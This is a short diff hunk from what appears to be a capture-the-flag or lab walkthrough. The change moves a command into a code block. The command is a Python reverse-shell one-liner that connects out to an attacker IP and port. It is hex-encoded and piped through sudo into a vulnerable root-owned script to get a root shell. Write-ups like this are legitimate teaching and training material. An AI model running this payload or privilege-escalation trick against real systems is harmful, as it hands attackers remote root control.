@@ -372,7 +372,9 @@ It appears that Python commands can be injected, as the input is being passed di
 
 My plan here is to execute a reverse shell payload. But before that, we'll set up a listener on our attacker machine. If everything works as intended, it should grant us a root shell.
 
-`python3 -c "print(b"import socket,os,pty;s=socket.socket();s.connect(('192.168.121.32',5454));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('sh')".hex())" | sudo python3 /root/oras.py`
+```shell
+python3 -c "print(b"import socket,os,pty;s=socket.socket();s.connect(('192.168.121.32',5454));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('sh')".hex())" | sudo python3 /root/oras.py
+```
 
 Execute and here's the result
 
